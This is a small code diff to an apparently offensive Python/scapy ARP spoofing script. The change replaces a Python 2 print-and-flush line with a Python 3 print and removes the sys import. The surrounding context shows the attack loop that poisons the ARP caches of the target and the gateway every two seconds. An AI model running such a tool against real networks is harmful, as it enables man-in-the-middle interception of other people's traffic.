@@ -5,7 +5,6 @@ import re
 import scapy.layers.l2 as l2
 import scapy.all as scapy
 import time
-import sys
 
 
 def get_arguments():
@@ -50,8 +49,7 @@ try:
         spoof(user_input.target_ip, user_input.gateway_ip)
         spoof(user_input.gateway_ip, user_input.target_ip)
         packet_counter = packet_counter + 1
-        print("\rPackets sent: " + str(packet_counter)),
-        sys.stdout.flush()
+        print("\rPackets sent: " + str(packet_counter), end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("\nExiting script. Restoring ARP tables, please wait.\n")
